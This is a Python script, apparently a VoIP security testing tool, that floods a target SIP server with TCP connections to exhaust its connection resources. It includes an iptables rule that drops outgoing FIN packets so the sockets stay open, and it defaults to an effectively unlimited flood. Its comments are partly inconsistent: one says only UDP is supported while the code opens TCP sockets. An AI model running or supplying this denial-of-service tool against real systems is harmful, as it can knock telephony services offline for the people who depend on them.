#!/usr/bin/python
# This script is "quick and dirty" and is not meant to handle all possibilities and exceptions.
# This script creates a TCP exhaustion condition. Run at your own risk!!
# To block FIN packets (and keep TCP sockets open) enter the iptables rule below
# iptables -A OUTPUT -p tcp --tcp-flags FIN FIN -d 66.66.66.2 -j DROP

from random import randrange
from optparse import OptionParser
import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 
conf.verb = 0

def promisc(state):
#Manage interface promiscuity. valid states are on or off
        ret =  os.system("ip link set " + conf.iface + " promisc " + state)
        if ret == 1:
                print ("You must run this script with root permissions.")

# Parse options
usage = "usage: %prog [options] arg1 arg2"
parser = OptionParser(usage=usage)
parser.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
parser.add_option("-d", "--dest", dest="server", help="Destination SIP server")
(options, args) = parser.parse_args()

# Initialize default values and determine interfce IP that will be sending to server
counter, i = 0, 0
client_port = 5060
server_port = 3001 
pkt= IP(dst=options.server)
client = pkt.src
promisc("on")

# Note that only UDP is supported
counter = options.counter 
while i < counter:
	try:
        	payload = ("\r\n")
		#Send the packet we built
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((options.server, server_port))
		sent=s.send(payload)
		i +=1
	except (KeyboardInterrupt):
		promisc("off")
		print("Exiting traffic generation...")
		raise SystemExit

promisc("off")
